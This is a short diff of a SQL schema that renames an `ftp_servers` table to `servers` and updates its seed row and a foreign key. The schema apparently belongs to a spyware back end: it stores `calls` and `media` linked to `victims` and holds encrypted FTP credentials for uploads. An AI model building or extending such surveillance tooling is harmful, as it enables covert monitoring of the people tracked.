@@ -213,8 +213,8 @@ CREATE TABLE IF NOT EXISTS `calls` (
     ON UPDATE CASCADE
 );
 
-DROP TABLE IF EXISTS `ftp_servers`;
-CREATE TABLE IF NOT EXISTS `ftp_servers` (
+DROP TABLE IF EXISTS `servers`;
+CREATE TABLE IF NOT EXISTS `servers` (
   `id`                  INT(11)     NOT NULL AUTO_INCREMENT,
   `name`                VARCHAR(10) NOT NULL,
   `ftp_domain_enc`      TEXT        NOT NULL,
@@ -225,7 +225,7 @@ CREATE TABLE IF NOT EXISTS `ftp_servers` (
   PRIMARY KEY (id)
 );
 
-INSERT INTO `ftp_servers` (name, ftp_domain_enc, ftp_username_enc, ftp_password_enc, size_in_mb) VALUES
+INSERT INTO `servers` (name, ftp_domain_enc, ftp_username_enc, ftp_password_enc, size_in_mb) VALUES
   ('SERVER 1', 'U1kHyw0ABMAbfhg++WHYOaSJLrdi+Pht/EKPPJWGE8k=', 'mod6MfmVQKxTqzFLhxY3qQ==', 'cUmCHjmVHcz2i5Ucgqkp3Q==',
    1500);
 
@@ -247,7 +247,7 @@ CREATE TABLE IF NOT EXISTS `media` (
   FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`)
     ON DELETE CASCADE
     ON UPDATE CASCADE,
-  FOREIGN KEY (`ftp_server_id`) REFERENCES `ftp_servers` (`id`)
+  FOREIGN KEY (`ftp_server_id`) REFERENCES `servers` (`id`)
     ON DELETE CASCADE
     ON UPDATE CASCADE
 );
